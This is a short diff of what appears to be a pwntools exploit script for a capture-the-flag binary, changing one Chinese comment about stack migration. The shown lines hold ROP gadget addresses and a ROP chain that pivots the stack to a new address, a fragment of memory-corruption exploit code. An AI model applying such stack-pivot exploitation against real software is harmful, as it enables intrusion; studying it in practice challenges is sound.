@@ -12,7 +12,7 @@ new_bank = bank_address + bank_offset
 leave_ret = 0x400699
 pop_rdi_ret = 0x400703
 
-# 栈迁移到borrowed_stack的位置
+# 栈迁移到new_bank的位置
 migrate_chain = ROP([elf])
 migrate_chain.migrate(new_bank)
 p.recvline()
